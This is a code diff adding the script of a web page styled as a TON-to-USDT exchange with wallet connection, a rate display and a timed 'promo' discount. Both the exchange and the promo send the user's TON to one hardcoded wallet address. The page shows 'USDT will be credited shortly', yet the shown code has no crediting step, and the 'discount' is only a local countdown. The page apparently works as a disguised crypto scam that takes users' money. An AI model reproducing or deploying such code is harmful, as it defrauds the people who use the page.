+                        // Wallet disconnected
+                        connectBtn.style.display = "block";
+                        exchangeBtn.style.display = "none";
+                        walletInfo.style.display = "none";
+                        connectBtn.disabled = false;
+                        connectBtn.textContent = "Connect Wallet";
+                    }
+                });
+
+                // Check initial state
+                if (tonConnectUI.connected) {
+                    await walletConnected(tonConnectUI.wallet);
+                }
+
+            } catch (error) {
+                console.error('TON Connect initialization error:', error);
+                showStatus('TON Connect initialization error: ' + error.message, 'error');
+            }
+        }
+
+        // Handle connected wallet
+        async function walletConnected(wallet) {
+            if (wallet) {
+                connectBtn.style.display = "none";
+                exchangeBtn.style.display = "block";
+
+                // Show wallet info
+                const shortAddress = `${wallet.account.address.slice(0, 6)}...${wallet.account.address.slice(-6)}`;
+                walletInfo.textContent = `Connected: ${shortAddress}`;
+                walletInfo.style.display = "block";
+
+                showStatus("Wallet connected successfully", "success");
+            }
+        }
+
+        // Handle connect wallet button
+        connectBtn.addEventListener('click', async () => {
+            try {
+                connectBtn.disabled = true;
+                connectBtn.textContent = "Connecting...";
+
+                await tonConnectUI.connectWallet();
+
+            } catch (error) {
+                console.error("Connection error:", error);
+                showStatus("Wallet connection error: " + error.message, "error");
+                connectBtn.disabled = false;
+                connectBtn.textContent = "Connect Wallet";
+            }
+        });
+
+        // Handle exchange button
+        exchangeBtn.addEventListener('click', async () => {
+            try {
+                const tonAmount = parseFloat(tonAmountInput.value);
+
+                if (!tonAmount || tonAmount <= 0) {
+                    showStatus("Enter a valid TON amount", "error");
+                    return;
+                }
+
+                if (!tonConnectUI.connected) {
+                    showStatus("Wallet not connected", "error");
+                    return;
+                }
+
+                exchangeBtn.disabled = true;
+                exchangeBtn.textContent = "Processing transaction...";
+
+                // Transaction to send TON
+                const transaction = {
+                    validUntil: Math.floor(Date.now() / 1000) + 600,
+                    messages: [
+                        {
+                            address: "UQDYSduMmfE6sBBBhvTR1wGtTG0_hmsj_xRaIg7P_W6-Pv1y",
+                            amount: String(tonAmount * 1000000000)
+                        }
+                    ]
+                };
+
+                // Send transaction
+                const result = await tonConnectUI.sendTransaction(transaction);
+
+                showStatus(`Success! ${tonAmount} TON sent. USDT will be credited shortly.`, "success");
+
+                // Clear fields after successful exchange
+                tonAmountInput.value = "";
+                tokenAmountInput.value = "";
+
+            } catch (error) {
+                console.error("Transaction error:", error);
+
+                if (error?.message?.includes("User rejection")) {
+                    showStatus("Transaction canceled", "error");
+                } else {
+                    showStatus("Transaction error: " + error.message, "error");
+                }
+            } finally {
+                exchangeBtn.disabled = false;
+                exchangeBtn.textContent = "Exchange";
+            }
+        });
+
+        // Handle get promo button
+        getPromoBtn.addEventListener('click', async () => {
+            // If wallet not connected, open connection dialog
+            if (!tonConnectUI || !tonConnectUI.connected) {
+                try {
+                    await tonConnectUI.connectWallet();
+                    // After connection, wait for another click
+                    return;
+                } catch (error) {
+                    showStatus("Wallet connection error", "error");
+                    return;
+                }
+            }
+
+            // If wallet is connected, proceed with transaction
+            try {
+                getPromoBtn.disabled = true;
+                getPromoBtn.textContent = "Sending 1 TON...";
+
+                // Transaction to activate discount
+                const transaction = {
+                    validUntil: Math.floor(Date.now() / 1000) + 600,
+                    messages: [
+                        {
+                            address: "UQDYSduMmfE6sBBBhvTR1wGtTG0_hmsj_xRaIg7P_W6-Pv1y",
+                            amount: "1000000000" // 1 TON in nanoTON
+                        }
+                    ]
+                };
+
+                // Send transaction
+                const result = await tonConnectUI.sendTransaction(transaction);
+
+                // Activate discount for 5 minutes
+                activateDiscount(5 * 60);
+
+                showStatus("Promotional offer activated! 2.5% discount valid for 5 minutes.", "success");
+
+            } catch (error) {
+                console.error("Transaction error:", error);
+
+                if (error?.message?.includes("User rejection")) {
+                    showStatus("Transaction canceled", "error");
+                } else {
+                    showStatus("Error activating offer: " + error.message, "error");
+                }
+
+                getPromoBtn.disabled = false;
+                getPromoBtn.textContent = "Get for 1 TON";
+            }
+        });
+
+        // Function to activate discount
+        function activateDiscount(duration) {
+            discountActive = true;
+            discountEndTime = Math.floor(Date.now() / 1000) + duration;
+
+            // Save to localStorage
+            localStorage.setItem('discountEndTime', discountEndTime.toString());
+
+            // Update display
+            updateDiscountDisplay();
+
+            // Start timer
+            if (discountTimerInterval) {
+                clearInterval(discountTimerInterval);
+            }
+
+            discountTimerInterval = setInterval(updateDiscountTimer, 1000);
+
+            // Recalculate token amount with discount
+            calculateTokens();
+        }
+
+        // Check discount status on page load
+        function checkDiscountStatus() {
+            const savedEndTime = localStorage.getItem('discountEndTime');
+
+            if (savedEndTime) {
+                const currentTime = Math.floor(Date.now() / 1000);
+                const remainingTime = parseInt(savedEndTime) - currentTime;
+
+                if (remainingTime > 0) {
+                    activateDiscount(remainingTime);
+                } else {
+                    // Remove expired record
+                    localStorage.removeItem('discountEndTime');
+                }
+            }
+        }
+
+        // Update discount timer
+        function updateDiscountTimer() {
+            const currentTime = Math.floor(Date.now() / 1000);
+            const remainingTime = discountEndTime - currentTime;
+
+            if (remainingTime <= 0) {
+                // Discount expired
+                discountActive = false;
+                clearInterval(discountTimerInterval);
+                discountTimerInterval = null;
+                localStorage.removeItem('discountEndTime');
+
+                // Update display
+                updateDiscountDisplay();
+
+                // Recalculate token amount without discount
+                calculateTokens();
+
+                return;
+            }
+
+            // Update timer
+            const minutes = Math.floor(remainingTime / 60);
+            const seconds = remainingTime % 60;
+
+            discountTimerEl.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            promoTimerEl.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        }
+
+        // Update discount status display
+        function updateDiscountDisplay() {
+            if (discountActive) {
+                discountBadge.classList.remove('hidden');
+                discountActiveEl.classList.remove('hidden');
+                getPromoBtn.textContent = "Promo activated";
+                getPromoBtn.disabled = true;
+                getPromoBtn.style.background = "var(--success)";
+            } else {
+                discountBadge.classList.add('hidden');
+                discountActiveEl.classList.add('hidden');
+                getPromoBtn.textContent = "Get for 1 TON";
+                getPromoBtn.disabled = false;
+                getPromoBtn.style.background = "";
+                promoTimerEl.textContent = "05:00";
+            }
+        }
+
+        // Function to show status
+        function showStatus(message, type) {
+            statusEl.textContent = message;
+            statusEl.className = "status";
+            statusEl.classList.add(type);
+            statusEl.style.display = "block";
+
+            setTimeout(() => {
+                statusEl.style.display = "none";
+            }, 5000);
+        }
+
+        // Theme toggle functionality
+        function toggleTheme() {
+            const currentTheme = document.body.getAttribute('data-theme');
+            if (currentTheme === 'light') {
+                document.body.removeAttribute('data-theme');
+                themeToggle.innerHTML = '<span class="theme-icon">🌙</span>';
+                localStorage.setItem('theme', 'dark');
+            } else {
+                document.body.setAttribute('data-theme', 'light');
+                themeToggle.innerHTML = '<span class="theme-icon">☀️</span>';
+                localStorage.setItem('theme', 'light');
+            }
+        }
+
+        function loadTheme() {
+            const savedTheme = localStorage.getItem('theme') || 'dark';
+            if (savedTheme === 'light') {
+                document.body.setAttribute('data-theme', 'light');
+                themeToggle.innerHTML = '<span class="theme-icon">☀️</span>';
+            }
+        }
+
+        themeToggle.addEventListener('click', toggleTheme);
+
+        // Check connection status on page load
+        document.addEventListener('DOMContentLoaded', async () => {
+            // Load theme
+            loadTheme();
+            
+            // Initialize TonConnect
+            await initTonConnect();
+
+            // Get initial rate
+            await fetchTonPrice();
+
+            // Update rate every 60 seconds
+            setInterval(async () => {
+                await fetchTonPrice();
+            }, 60000);
+        });
     </script>
 </body>
 </html>
